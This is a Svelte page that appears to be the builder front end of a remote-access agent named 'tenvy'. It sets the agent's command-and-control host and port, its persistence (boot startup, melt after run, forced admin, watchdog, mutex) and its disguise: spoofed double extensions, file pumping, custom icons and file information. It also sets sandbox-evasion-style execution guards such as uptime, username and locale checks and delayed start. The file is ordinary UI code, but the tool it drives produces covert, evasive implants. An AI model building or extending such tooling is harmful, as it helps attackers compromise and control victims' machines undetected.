<script lang="ts">
	import { Badge } from '$lib/components/ui/badge/index.js';
	import { Button } from '$lib/components/ui/button/index.js';
	import {
		Card,
		CardContent,
		CardDescription,
		CardHeader,
		CardTitle
	} from '$lib/components/ui/card/index.js';
	import { Tabs, TabsContent, TabsList, TabsTrigger } from '$lib/components/ui/tabs/index.js';
	import { onDestroy } from 'svelte';
	import { SvelteSet } from 'svelte/reactivity';
	import { toast } from 'svelte-sonner';
	import ConnectionTab from './components/ConnectionTab.svelte';
	import PersistenceTab from './components/PersistenceTab.svelte';
	import ExecutionTab from './components/ExecutionTab.svelte';
	import PresentationTab from './components/PresentationTab.svelte';
	import {
		ANTI_TAMPER_BADGES,
		ARCHITECTURE_OPTIONS_BY_OS,
		DEFAULT_FILE_INFORMATION,
		EXTENSION_OPTIONS_BY_OS,
		EXTENSION_SPOOF_PRESETS,
		FILE_PUMPER_UNIT_TO_BYTES,
		MAX_FILE_PUMPER_BYTES,
		type CookieKV,
		type ExtensionSpoofPreset,
		type FilePumperUnit,
		type HeaderKV,
		type TargetArch,
		type TargetOS
	} from './lib/constants.js';
	import {
		addCustomCookie as createCustomCookie,
		addCustomHeader as createCustomHeader,
		generateMutexName as randomMutexSuffix,
		normalizeSpoofExtension,
		parseListInput,
		removeCustomCookie as deleteCustomCookie,
		removeCustomHeader as deleteCustomHeader,
		sanitizeFileInformation as sanitizeFileInformationPayload,
		toIsoDateTime,
		updateCustomCookie as writeCustomCookie,
		updateCustomHeader as writeCustomHeader,
		validateSpoofExtension,
		withPresetSpoofExtension
	} from './lib/utils.js';
	import type { BuildRequest } from '../../../../../shared/types/build';

	type BuildStatus = 'idle' | 'running' | 'success' | 'error';

	type BuildResponse = {
		success: boolean;
		message?: string;
		downloadUrl?: string;
		outputPath?: string;
		log?: string[];
		sharedSecret?: string;
		warnings?: string[];
	};

	let host = $state('localhost');
	let port = $state('2332');
	let outputFilename = $state('tenvy-client');
	let targetOS = $state<TargetOS>('windows');
	let targetArch = $state<TargetArch>('amd64');
	let outputExtension = $state(EXTENSION_OPTIONS_BY_OS.windows[0]);
	let extensionSpoofingEnabled = $state(false);
	let extensionSpoofPreset = $state<ExtensionSpoofPreset>(EXTENSION_SPOOF_PRESETS[0]);
	let extensionSpoofCustom = $state('');
	let extensionSpoofError = $state<string | null>(null);
	let installationPath = $state('');
	let meltAfterRun = $state(false);
	let startupOnBoot = $state(false);
	let developerMode = $state(true);
	let mutexName = $state('');
	let compressBinary = $state(false);
	let forceAdmin = $state(false);
	let fileIconName = $state<string | null>(null);
	let fileIconData = $state<string | null>(null);
	let fileIconError = $state<string | null>(null);
	let buildWarnings = $state<string[]>([]);
	let pollIntervalMs = $state('');
	let maxBackoffMs = $state('');
	let shellTimeoutSeconds = $state('');
	let fileInformation = $state({ ...DEFAULT_FILE_INFORMATION });
	let fileInformationOpen = $state(false);
	let watchdogEnabled = $state(false);
	let watchdogIntervalSeconds = $state('60');
	let enableFilePumper = $state(false);
	let filePumperTargetSize = $state('');
	let filePumperUnit = $state<FilePumperUnit>('MB');
	let executionDelaySeconds = $state('');
	let executionAllowedUsernames = $state('');
	let executionAllowedLocales = $state('');
	let executionMinUptimeMinutes = $state('');
	let executionStartDate = $state('');
	let executionEndDate = $state('');
	let executionRequireInternet = $state(true);
	let customHeaders = $state<HeaderKV[]>([{ key: '', value: '' }]);
	let customCookies = $state<CookieKV[]>([{ name: '', value: '' }]);
	let activeTab = $state<'connection' | 'persistence' | 'execution' | 'presentation'>('connection');

	const KNOWN_EXTENSION_SUFFIXES = Array.from(
		new Set(
			Object.values(EXTENSION_OPTIONS_BY_OS)
				.flat()
				.map((extension) => extension.toLowerCase())
		)
	);

	const SPOOF_PRESET_SUFFIXES = EXTENSION_SPOOF_PRESETS.map((preset) => preset.toLowerCase());

	const activeSpoofExtension = $derived(
		withPresetSpoofExtension(extensionSpoofingEnabled, extensionSpoofCustom, extensionSpoofPreset)
	);

	const sanitizedOutputBase = $derived.by(() => {
		const trimmed = outputFilename.trim();
		if (!trimmed) {
			return 'tenvy-client';
		}

		let working = trimmed;
		let normalized = working.toLowerCase();

		const targetExtensions = EXTENSION_OPTIONS_BY_OS[targetOS] ?? [];
		const normalizedCustomSpoof = normalizeSpoofExtension(extensionSpoofCustom)?.toLowerCase();

		const suffixes = [
			activeSpoofExtension.toLowerCase(),
			normalizedCustomSpoof,
			...SPOOF_PRESET_SUFFIXES,
			...targetExtensions.map((extension) => extension.toLowerCase()),
			...KNOWN_EXTENSION_SUFFIXES
		];

		const seen = new SvelteSet<string>();
		for (const suffix of suffixes) {
			if (!suffix || seen.has(suffix)) {
				continue;
			}
			seen.add(suffix);

			while (normalized.endsWith(suffix)) {
				working = working.slice(0, -suffix.length);
				normalized = working.toLowerCase();
			}
		}

		const sanitized = working
			.replace(/[^A-Za-z0-9._-]/g, '_')
			.replace(/\.+$/, '')
			.trim();

		return sanitized || 'tenvy-client';
	});

	const effectiveOutputFilename = $derived(
		`${sanitizedOutputBase}${activeSpoofExtension}${outputExtension}`
	);

	const isWindowsTarget = $derived(targetOS === 'windows');

	let buildStatus = $state<BuildStatus>('idle');
	let buildError = $state<string | null>(null);
	let downloadUrl = $state<string | null>(null);
	let outputPath = $state<string | null>(null);

	const BUILD_STATUS_TOAST_ID = 'build-status-toast';

	let lastToastedStatus: BuildStatus = 'idle';
	let lastWarningSignature = '';

	let isBuilding = $derived(buildStatus === 'running');

	$effect(() => {
		const allowedExtensions = EXTENSION_OPTIONS_BY_OS[targetOS] ?? EXTENSION_OPTIONS_BY_OS.windows;
		if (!allowedExtensions.includes(outputExtension)) {
			outputExtension = allowedExtensions[0];
		}
	});

	$effect(() => {
		const archOptions = ARCHITECTURE_OPTIONS_BY_OS[targetOS] ?? ARCHITECTURE_OPTIONS_BY_OS.windows;
		if (!archOptions.some((option) => option.value === targetArch)) {
			targetArch = archOptions[0]?.value ?? 'amd64';
		}
	});

	$effect(() => {
		if (!isWindowsTarget) {
			fileIconName = null;
			fileIconData = null;
			fileIconError = null;
			fileInformation = { ...DEFAULT_FILE_INFORMATION };
		}
	});

	$effect(() => {
		if (!extensionSpoofingEnabled) {
			extensionSpoofError = null;
			return;
		}

		extensionSpoofError = validateSpoofExtension(extensionSpoofCustom) ?? null;
	});

	$effect(() => {
		const status = buildStatus;

		if (status === 'idle') {
			if (lastToastedStatus !== 'idle') {
				toast.dismiss(BUILD_STATUS_TOAST_ID);
			}
			lastToastedStatus = status;
			return;
		}

		if (status === lastToastedStatus) {
			return;
		}

		if (status === 'running') {
			toast('Starting build…', {
				id: BUILD_STATUS_TOAST_ID,
				description: `Generating ${effectiveOutputFilename}`,
				position: 'bottom-right',
				duration: Infinity,
				dismissable: false
			});
		} else if (status === 'success') {
			const parts: string[] = [];
			if (downloadUrl) {
				parts.push('Download is ready.');
			}
			if (outputPath) {
				parts.push(`Saved to ${outputPath}.`);
			}
			const url = downloadUrl;
			const action = url
				? {
						label: 'Download',
						onClick: () => {
							if (typeof window !== 'undefined') {
								window.open(url, '_blank', 'noopener');
							}
						}
					}
				: undefined;
			toast.success('Build completed', {
				id: BUILD_STATUS_TOAST_ID,
				description: parts.length > 0 ? parts.join(' ') : 'Agent binary is ready to deploy.',
				position: 'bottom-right',
				action
			});
		} else if (status === 'error') {
			toast.error(buildError ?? 'Failed to build agent.', {
				id: BUILD_STATUS_TOAST_ID,
				position: 'bottom-right'
			});
		}

		lastToastedStatus = status;
	});

	$effect(() => {
		if (buildStatus !== 'success') {
			lastWarningSignature = '';
			return;
		}

		if (!buildWarnings.length) {
			lastWarningSignature = '';
			return;
		}

		const signature = buildWarnings.join('\u0000');
		if (signature === lastWarningSignature) {
			return;
		}

		for (const warning of buildWarnings) {
			toast('Build warning', {
				description: warning,
				position: 'bottom-right'
			});
		}

		lastWarningSignature = signature;
	});

	function resetProgress() {
		buildStatus = 'idle';
		buildError = null;
		downloadUrl = null;
		outputPath = null;
		buildWarnings = [];
		fileIconError = null;
	}

	function pushProgress(text: string, tone: 'info' | 'success' | 'error' = 'info') {
		const options = { position: 'bottom-right' as const };
		if (tone === 'success') {
			toast.success(text, options);
			return;
		}

		if (tone === 'error') {
			return;
		}

		toast(text, options);
	}

	function notifySharedSecret(secret: string | null) {
		if (!secret) {
			return;
		}

		toast('Generated shared secret', {
			description: secret,
			position: 'bottom-right',
			duration: Infinity,
			dismissable: true,
			action: {
				label: 'Copy',
				onClick: async () => {
					if (typeof navigator === 'undefined' || !navigator.clipboard) {
						toast.error('Clipboard is unavailable', { position: 'bottom-right' });
						return;
					}

					try {
						await navigator.clipboard.writeText(secret);
						toast.success('Secret copied', { position: 'bottom-right' });
					} catch (error) {
						const message = error instanceof Error ? error.message : 'Failed to copy secret.';
						toast.error(message, { position: 'bottom-right' });
					}
				}
			}
		});
	}

	function applyInstallationPreset(preset: string) {
		installationPath = preset;
	}

	function addCustomHeader() {
		customHeaders = createCustomHeader(customHeaders);
	}

	function updateCustomHeader(index: number, key: keyof HeaderKV, value: string) {
		customHeaders = writeCustomHeader(customHeaders, index, key, value);
	}

	function removeCustomHeader(index: number) {
		const updated = deleteCustomHeader(customHeaders, index);
		customHeaders = updated.length > 0 ? updated : [{ key: '', value: '' }];
	}

	function addCustomCookie() {
		customCookies = createCustomCookie(customCookies);
	}

	function updateCustomCookie(index: number, key: keyof CookieKV, value: string) {
		customCookies = writeCustomCookie(customCookies, index, key, value);
	}

	function removeCustomCookie(index: number) {
		const updated = deleteCustomCookie(customCookies, index);
		customCookies = updated.length > 0 ? updated : [{ name: '', value: '' }];
	}

	function assignMutexName(length = 16) {
		mutexName = `Global\\tenvy-${randomMutexSuffix(length).toUpperCase()}`;
	}

	async function handleIconSelection(event: Event) {
		const input = event.target as HTMLInputElement;
		const file = input.files?.[0] ?? null;
		fileIconError = null;

		if (!file) {
			fileIconName = null;
			fileIconData = null;
			return;
		}

		if (file.size > 512 * 1024) {
			fileIconError = 'Icon file must be 512KB or smaller.';
			fileIconName = null;
			fileIconData = null;
			return;
		}

		try {
			const buffer = await file.arrayBuffer();
			const bytes = new Uint8Array(buffer);
			let binary = '';
			for (const byte of bytes) {
				binary += String.fromCharCode(byte);
			}
			fileIconData = btoa(binary);
			fileIconName = file.name;
		} catch (err) {
			fileIconError = err instanceof Error ? err.message : 'Failed to read icon file.';
			fileIconName = null;
			fileIconData = null;
		}
	}

	function clearIconSelection() {
		fileIconName = null;
		fileIconData = null;
		fileIconError = null;
	}

	async function buildAgent() {
		if (buildStatus === 'running') {
			return;
		}

		resetProgress();

		const trimmedHost = host.trim();
		const trimmedPort = port.trim();
		const trimmedPollInterval = pollIntervalMs.trim();
		const trimmedMaxBackoff = maxBackoffMs.trim();
		const trimmedShellTimeout = shellTimeoutSeconds.trim();

		if (!trimmedHost) {
			buildError = 'Host is required.';
			pushProgress(buildError, 'error');
			buildStatus = 'error';
			return;
		}
		if (trimmedPort && !/^\d+$/.test(trimmedPort)) {
			buildError = 'Port must be numeric.';
			pushProgress(buildError, 'error');
			buildStatus = 'error';
			return;
		}
		if (trimmedPollInterval) {
			const pollValue = Number(trimmedPollInterval);
			if (!Number.isFinite(pollValue) || pollValue < 1000 || pollValue > 3_600_000) {
				buildError = 'Poll interval must be between 1,000 and 3,600,000 milliseconds.';
				pushProgress(buildError, 'error');
				buildStatus = 'error';
				return;
			}
		}
		if (trimmedMaxBackoff) {
			const backoffValue = Number(trimmedMaxBackoff);
			if (!Number.isFinite(backoffValue) || backoffValue < 1000 || backoffValue > 86_400_000) {
				buildError = 'Max backoff must be between 1,000 and 86,400,000 milliseconds.';
				pushProgress(buildError, 'error');
				buildStatus = 'error';
				return;
			}
		}
		if (trimmedShellTimeout) {
			const timeoutValue = Number(trimmedShellTimeout);
			if (!Number.isFinite(timeoutValue) || timeoutValue < 5 || timeoutValue > 7_200) {
				buildError = 'Shell timeout must be between 5 and 7,200 seconds.';
				pushProgress(buildError, 'error');
				buildStatus = 'error';
				return;
			}
		}

		const sanitizedHeaders = customHeaders
			.map((header) => ({
				key: header.key.trim(),
				value: header.value.trim()
			}))
			.filter((header) => header.key !== '' && header.value !== '');

		const sanitizedCookies = customCookies
			.map((cookie) => ({
				name: cookie.name.trim(),
				value: cookie.value.trim()
			}))
			.filter((cookie) => cookie.name !== '' && cookie.value !== '');

		const trimmedWatchdogInterval = watchdogIntervalSeconds.trim();
		let watchdogIntervalValue: number | null = null;
		if (watchdogEnabled) {
			const interval = trimmedWatchdogInterval ? Number(trimmedWatchdogInterval) : 60;
			if (!Number.isFinite(interval) || interval < 5 || interval > 86_400) {
				buildError = 'Watchdog interval must be between 5 and 86,400 seconds.';
				pushProgress(buildError, 'error');
				buildStatus = 'error';
				return;
			}
			watchdogIntervalValue = Math.round(interval);
		}

		const trimmedFilePumperSize = filePumperTargetSize.trim();
		let filePumperTargetBytes: number | null = null;
		if (enableFilePumper) {
			if (!trimmedFilePumperSize) {
				buildError = 'Provide a target size for the file pumper or disable the feature.';
				pushProgress(buildError, 'error');
				buildStatus = 'error';
				return;
			}

			const parsedSize = Number.parseFloat(trimmedFilePumperSize);
			if (!Number.isFinite(parsedSize) || parsedSize <= 0) {
				buildError = 'File pumper size must be a positive number.';
				pushProgress(buildError, 'error');
				buildStatus = 'error';
				return;
			}

			const multiplier = FILE_PUMPER_UNIT_TO_BYTES[filePumperUnit] ?? FILE_PUMPER_UNIT_TO_BYTES.MB;
			const computedBytes = Math.round(parsedSize * multiplier);
			if (
				!Number.isFinite(computedBytes) ||
				computedBytes <= 0 ||
				computedBytes > MAX_FILE_PUMPER_BYTES
			) {
				buildError = 'File pumper target size is too large. Maximum supported size is 10 GiB.';
				pushProgress(buildError, 'error');
				buildStatus = 'error';
				return;
			}

			filePumperTargetBytes = computedBytes;
		}

		const trimmedExecutionDelay = executionDelaySeconds.trim();
		let executionDelayValue: number | null = null;
		if (trimmedExecutionDelay) {
			const parsedDelay = Number.parseInt(trimmedExecutionDelay, 10);
			if (!Number.isFinite(parsedDelay) || parsedDelay < 0 || parsedDelay > 86_400) {
				buildError = 'Delayed start must be between 0 and 86,400 seconds.';
				pushProgress(buildError, 'error');
				buildStatus = 'error';
				return;
			}
			executionDelayValue = parsedDelay;
		}

		const trimmedExecutionUptime = executionMinUptimeMinutes.trim();
		let executionUptimeValue: number | null = null;
		if (trimmedExecutionUptime) {
			const parsedUptime = Number.parseInt(trimmedExecutionUptime, 10);
			if (!Number.isFinite(parsedUptime) || parsedUptime < 0 || parsedUptime > 10_080) {
				buildError = 'Minimum uptime must be between 0 and 10,080 minutes (7 days).';
				pushProgress(buildError, 'error');
				buildStatus = 'error';
				return;
			}
			executionUptimeValue = parsedUptime;
		}

		const allowedUsernames = parseListInput(executionAllowedUsernames);
		const allowedLocales = parseListInput(executionAllowedLocales);

		const startIso = toIsoDateTime(executionStartDate);
		if (executionStartDate.trim() && !startIso) {
			buildError = 'Earliest run time must be a valid date/time.';
			pushProgress(buildError, 'error');
			buildStatus = 'error';
			return;
		}

		const endIso = toIsoDateTime(executionEndDate);
		if (executionEndDate.trim() && !endIso) {
			buildError = 'Latest run time must be a valid date/time.';
			pushProgress(buildError, 'error');
			buildStatus = 'error';
			return;
		}

		if (startIso && endIso) {
			const startTime = new Date(startIso).getTime();
			const endTime = new Date(endIso).getTime();
			if (Number.isFinite(startTime) && Number.isFinite(endTime) && startTime > endTime) {
				buildError = 'Earliest run time must be before the latest run time.';
				pushProgress(buildError, 'error');
				buildStatus = 'error';
				return;
			}
		}

		buildStatus = 'running';
		pushProgress('Preparing build request...');

		const payload: BuildRequest = {
			host: trimmedHost,
			port: trimmedPort || '2332',
			outputFilename: effectiveOutputFilename,
			outputExtension,
			targetOS,
			targetArch,
			installationPath: installationPath.trim(),
			meltAfterRun,
			startupOnBoot,
			developerMode,
			mutexName: mutexName.trim(),
			compressBinary,
			forceAdmin
		};

		if (watchdogIntervalValue !== null) {
			payload.watchdog = {
				enabled: true,
				intervalSeconds: watchdogIntervalValue
			};
		}
		if (filePumperTargetBytes !== null) {
			payload.filePumper = {
				enabled: true,
				targetBytes: filePumperTargetBytes
			};
		}

		const shouldIncludeExecutionTriggers =
			executionDelayValue !== null ||
			executionUptimeValue !== null ||
			allowedUsernames.length > 0 ||
			allowedLocales.length > 0 ||
			Boolean(startIso) ||
			Boolean(endIso) ||
			!executionRequireInternet;

		if (shouldIncludeExecutionTriggers) {
			const executionPayload: Record<string, unknown> = {
				requireInternet: executionRequireInternet
			};
			if (executionDelayValue !== null) {
				executionPayload.delaySeconds = executionDelayValue;
			}
			if (executionUptimeValue !== null) {
				executionPayload.minUptimeMinutes = executionUptimeValue;
			}
			if (allowedUsernames.length > 0) {
				executionPayload.allowedUsernames = allowedUsernames;
			}
			if (allowedLocales.length > 0) {
				executionPayload.allowedLocales = allowedLocales;
			}
			if (startIso) {
				executionPayload.startTime = startIso;
			}
			if (endIso) {
				executionPayload.endTime = endIso;
			}
			payload.executionTriggers = executionPayload;
		}

		if (sanitizedHeaders.length > 0) {
			payload.customHeaders = sanitizedHeaders;
		}
		if (sanitizedCookies.length > 0) {
			payload.customCookies = sanitizedCookies;
		}
		if (trimmedPollInterval) {
			payload.pollIntervalMs = trimmedPollInterval;
		}
		if (trimmedMaxBackoff) {
			payload.maxBackoffMs = trimmedMaxBackoff;
		}
		if (trimmedShellTimeout) {
			payload.shellTimeoutSeconds = trimmedShellTimeout;
		}
		if (isWindowsTarget && fileIconData) {
			payload.fileIcon = {
				name: fileIconName,
				data: fileIconData
			};
		}

		const info = sanitizeFileInformationPayload(fileInformation);
		if (isWindowsTarget && Object.keys(info).length > 0) {
			payload.fileInformation = info;
		}

		try {
			pushProgress('Dispatching build to compiler environment...');
			const response = await fetch('/api/build', {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify(payload)
			});

			const result = (await response.json()) as BuildResponse;
			buildWarnings = result.warnings ?? [];

			if (!response.ok || !result.success) {
				const message = result.message || 'Failed to build agent.';
				throw new Error(message);
			}

			pushProgress('Compilation completed. Finalizing artifacts...');

			downloadUrl = result.downloadUrl ?? null;
			outputPath = result.outputPath ?? null;

			buildStatus = 'success';
			pushProgress('Agent binary is ready.', 'success');
			notifySharedSecret(result.sharedSecret ?? null);
		} catch (err) {
			buildStatus = 'error';
			buildError = err instanceof Error ? err.message : 'Unknown build error.';
			pushProgress(buildError, 'error');
		}
	}

	onDestroy(() => {
		toast.dismiss(BUILD_STATUS_TOAST_ID);
	});
</script>

<div class="mx-auto w-full space-y-6 px-4 pb-10">
	<Card>
		<CardHeader class="space-y-4">
			<div class="flex flex-wrap items-center justify-between gap-3">
				<div class="space-y-1">
					<CardTitle>Build agent</CardTitle>
					<CardDescription>
						Configure connection and persistence options, then generate a customized client binary.
					</CardDescription>
				</div>
				<div class="flex flex-wrap gap-2">
					{#each ANTI_TAMPER_BADGES as badge (badge)}
						<Badge
							variant="outline"
							class="border-emerald-500/40 bg-emerald-500/10 text-[0.65rem] font-medium tracking-wide text-emerald-600 uppercase"
						>
							{badge}
						</Badge>
					{/each}
				</div>
			</div>
			<p class="text-xs text-muted-foreground">
				These safeguards are always embedded into generated builds. Customize the remaining options
				to match your delivery strategy.
			</p>
		</CardHeader>
		<CardContent class="space-y-8">
			<div class="grid gap-8 xl:grid-cols-[minmax(0,2.35fr)_minmax(0,1fr)]">
				<div class="space-y-8">
					<Tabs bind:value={activeTab} class="space-y-6">
						<TabsList
							class="flex w-full flex-wrap gap-2 rounded-lg border border-border/70 bg-muted/40 p-1"
						>
							<TabsTrigger value="connection" class="flex-1 sm:flex-none">Connection</TabsTrigger>
							<TabsTrigger value="persistence" class="flex-1 sm:flex-none">Persistence</TabsTrigger>
							<TabsTrigger value="execution" class="flex-1 sm:flex-none">Execution</TabsTrigger>
							<TabsTrigger value="presentation" class="flex-1 sm:flex-none"
								>Presentation</TabsTrigger
							>
						</TabsList>

						<TabsContent value="connection" class="space-y-6">
							<ConnectionTab
								bind:host
								bind:port
								bind:outputFilename
								{effectiveOutputFilename}
								bind:targetOS
								bind:targetArch
								bind:outputExtension
								bind:extensionSpoofingEnabled
								bind:extensionSpoofPreset
								bind:extensionSpoofCustom
								{extensionSpoofError}
								bind:pollIntervalMs
								bind:maxBackoffMs
								bind:shellTimeoutSeconds
								{customHeaders}
								{customCookies}
								{addCustomHeader}
								{updateCustomHeader}
								{removeCustomHeader}
								{addCustomCookie}
								{updateCustomCookie}
								{removeCustomCookie}
							/>
						</TabsContent>
						<TabsContent value="persistence" class="space-y-6">
							<PersistenceTab
								bind:installationPath
								bind:mutexName
								bind:meltAfterRun
								bind:startupOnBoot
								bind:developerMode
								bind:compressBinary
								bind:forceAdmin
								bind:watchdogEnabled
								bind:watchdogIntervalSeconds
								bind:enableFilePumper
								bind:filePumperTargetSize
								bind:filePumperUnit
								{applyInstallationPreset}
								{assignMutexName}
							/>
						</TabsContent>
						<TabsContent value="execution" class="space-y-6">
							<ExecutionTab
								bind:executionDelaySeconds
								bind:executionMinUptimeMinutes
								bind:executionAllowedUsernames
								bind:executionAllowedLocales
								bind:executionStartDate
								bind:executionEndDate
								bind:executionRequireInternet
							/>
						</TabsContent>
						<TabsContent value="presentation" class="space-y-6">
							<PresentationTab
								{fileIconName}
								{fileIconError}
								{handleIconSelection}
								{clearIconSelection}
								{isWindowsTarget}
								bind:fileInformationOpen
								{fileInformation}
							/>
						</TabsContent>
					</Tabs>
				</div>
				<aside class="space-y-4 xl:sticky xl:top-24">
					<div class="space-y-4 rounded-lg border border-border/70 bg-background/60 p-6">
						<div class="space-y-2">
							<h3 class="text-sm font-semibold">Ready to build?</h3>
							<p class="text-xs text-muted-foreground">
								Provide a host and port to embed defaults inside the generated binary. Additional
								preferences are stored for the agent to consume on first launch.
							</p>
						</div>
						<Button type="button" class="w-full" disabled={isBuilding} onclick={buildAgent}>
							{isBuilding ? 'Building…' : 'Build Agent'}
						</Button>
					</div>
				</aside>
			</div>
		</CardContent>
	</Card>
</div>
